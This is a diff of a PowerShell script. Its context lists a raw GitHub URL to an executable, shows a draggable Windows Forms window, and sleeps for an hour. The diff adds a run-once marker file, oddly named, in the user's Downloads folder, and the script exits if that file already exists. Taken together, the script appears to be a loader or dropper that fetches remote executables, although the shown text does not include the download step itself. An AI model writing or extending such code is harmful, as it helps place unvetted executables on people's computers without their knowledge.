@@ -5,6 +5,8 @@ $urls = @(
     "https://github.com/webntdev/webntdev.github.io/raw/main/application/WindowsFormsApp2.exe"
 )
 
+$filePath = Join-Path -Path $env:USERPROFILE -ChildPath "Downloads\wheiu.bz"
+
 Add-Type -AssemblyName System.Windows.Forms
 Add-Type -AssemblyName System.Drawing
 $form = New-Object System.Windows.Forms.Form
@@ -31,6 +33,12 @@ $form.Add_MouseDown({
     $form.Capture = $false
 })
 $form.Show()
+
+if (Test-Path -Path $filePath) {
+    exit
+} else {
+    New-Item -Path $filePath -ItemType File
+}
 
 Start-Sleep -Seconds 3600
 
